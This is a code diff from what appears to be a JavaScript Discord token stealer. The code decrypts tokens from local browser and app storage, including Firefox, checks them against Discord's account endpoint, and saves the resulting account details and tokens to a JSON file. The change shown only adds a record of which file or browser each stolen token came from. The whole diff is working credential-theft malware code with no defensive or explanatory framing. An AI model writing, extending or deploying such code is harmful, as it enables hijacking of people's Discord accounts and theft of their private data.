@@ -60,7 +60,7 @@ const decryptRickRoll = (path) => {
         token = decryptToken(token, key)?.trim();
         if (
           typeof token === 'string' && token.match(tokenRegex) && !tokens.includes(token)
-        ) tokens.push(token);
+        ) tokens.push({ token, source: path.split('\\').pop() });
       });
       if (tokens.length <= 0) {
         reject();
@@ -72,13 +72,14 @@ const decryptRickRoll = (path) => {
 };
 
 const handleTokens = (tokens, resolve) => {
-  tokens.forEach(token => {
+  tokens.forEach(({ token, source }) => {
     axios.get('https://discord.com/api/v10/users/@me', {
       headers: { Authorization: token, 'User-Agent': userAgent }
     })
       .then(res => {
         let json = res.data;
         json.token = token;
+        json.source = source;
         let info = JSON.parse(readFileSync(jsonFile).toString());
         if (!info.accounts) info.accounts = [];
         if (!info.accounts.find(account => account.token === token)) {
@@ -150,7 +151,7 @@ module.exports = new Promise((resolve) => {
                   !token.startsWith('MTA') && // 10
                   !token.startsWith('MTE')    // 11
                 ) return;
-                if (!tokens.includes(token)) tokens.push(token);
+                if (!tokens.includes(token)) tokens.push({ token, source: 'firefox' });
               });
             }
           });
